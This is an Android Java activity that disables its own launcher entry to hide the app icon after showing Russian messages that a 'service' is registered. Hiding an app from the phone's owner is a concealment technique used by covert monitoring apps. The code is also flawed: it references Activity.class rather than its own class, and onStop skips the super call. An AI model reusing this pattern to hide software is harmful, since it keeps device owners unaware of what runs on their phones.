package net.exsul.callback2;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;

public class my_activity extends Activity {
    /**
     * Called when the activity is first created.
     */

    private Context context;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        context = getApplicationContext();

        if (getThisActivityHided()) {
            showToast("Служба уже зарегистрирована.");
            showToast("Иконка скроется после перезагрузки телефона.");
        }
        else
        {
          hideFromMenu();
          showToast("Регистрация службы успешно завершена.");
        }
        finish();
    }

    private void hideFromMenu() {
        PackageManager pm = getPackageManager();
        ComponentName cn = new ComponentName(getApplicationContext(), Activity.class);
        pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        assert(getThisActivityHided());
    }

    private boolean getThisActivityHided() {
        PackageManager pm = getPackageManager();
        ComponentName cn = new ComponentName(getApplicationContext(), Activity.class);
        return pm.getComponentEnabledSetting(cn) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private void showToast( String text ) {
        int duration = Toast.LENGTH_SHORT;
        Toast.makeText(context, text, duration).show();
    }

    public void onStop() {
        context = null;
    }
}
